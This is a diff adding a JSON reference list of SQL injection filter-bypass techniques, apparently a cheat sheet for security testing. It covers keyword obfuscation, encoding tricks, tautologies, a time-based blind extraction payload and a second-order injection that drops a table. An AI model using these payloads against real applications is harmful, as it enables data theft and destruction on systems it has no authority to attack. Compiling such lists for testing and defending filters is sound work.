@@ -1,0 +1,85 @@
+{
+  "sql_injection_bypasses": [
+    {
+      "title": "Case Variation",
+      "example": "SeLeCt, UnIoN, ||",
+      "description": "Bypasses filters that only check for exact string matches by mixing upper and lowercase characters. Many SQL engines treat these as equivalent."
+    },
+    {
+      "title": "String Concatenation",
+      "example": {
+        "mysql": "CONCAT('SEL','ECT')",
+        "sqlserver": "'SEL'+'ECT'",
+        "oracle": "'SEL'||'ECT'"
+      },
+      "description": "Breaks up SQL keywords into smaller strings that are concatenated at runtime, evading keyword-based filters while producing valid SQL syntax."
+    },
+    {
+      "title": "Alternative Operators",
+      "example": {
+        "or_replacement": "||",
+        "and_replacement": "&&",
+        "not_replacement": "^%"
+      },
+      "description": "Uses equivalent logical operators that achieve the same result but aren't caught by filters looking for common keywords like 'OR' and 'AND'."
+    },
+    {
+      "title": "Comment Variations",
+      "example": [
+        "/*comment*/",
+        "/*!comment*/",
+        ";%00",
+        "#"
+      ],
+      "description": "Uses different comment syntaxes supported by SQL to terminate or comment out portions of queries. Different databases support different comment styles."
+    },
+    {
+      "title": "Whitespace Manipulation",
+      "example": [
+        "SELECT/**/FROM/**/users",
+        "SEL%0AECT*FR%0BOM%0Cusers"
+      ],
+      "description": "Bypasses filters that look for spaces between keywords by using alternative whitespace characters or comments to separate words while maintaining valid syntax."
+    },
+    {
+      "title": "Encoding Bypasses",
+      "example": {
+        "ascii": "CHAR(39)",
+        "unicode": "%u0027",
+        "double_url": "%2527"
+      },
+      "description": "Uses different character encoding schemes to represent special characters like quotes. The database decodes these at runtime into the intended characters."
+    },
+    {
+      "title": "Math-Based Logic",
+      "example": [
+        "2>1",
+        "'a'='a'",
+        "3<=3",
+        "EXISTS(SELECT 1)"
+      ],
+      "description": "Replaces simple true conditions like '1=1' with mathematically equivalent expressions that evaluate to true but may not be caught by filters."
+    },
+    {
+      "title": "Function Nesting",
+      "example": {
+        "database_function": "SUBSTRING(((SELECT DATABASE()),1,1))",
+        "length_check": "LENGTH(DATABASE())>1"
+      },
+      "description": "Nests multiple SQL functions together to obfuscate the actual operation being performed while still retrieving the desired data."
+    },
+    {
+      "title": "Time-Based Extraction",
+      "example": "IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>90,SLEEP(5),0)",
+      "description": "Uses time delays to extract data one bit at a time when direct output isn't possible. The response time indicates whether a condition is true or false."
+    },
+    {
+      "title": "Second-Order Injection",
+      "example": {
+        "first_request": "INSERT INTO users (name) VALUES ('x'; DROP TABLE users;--)",
+        "second_request": "SELECT name FROM users WHERE id=1"
+      },
+      "description": "Stores malicious SQL in the database through one request that appears safe, then triggers it through a second request when the stored value is used in a query."
+    }
+  ]
+}
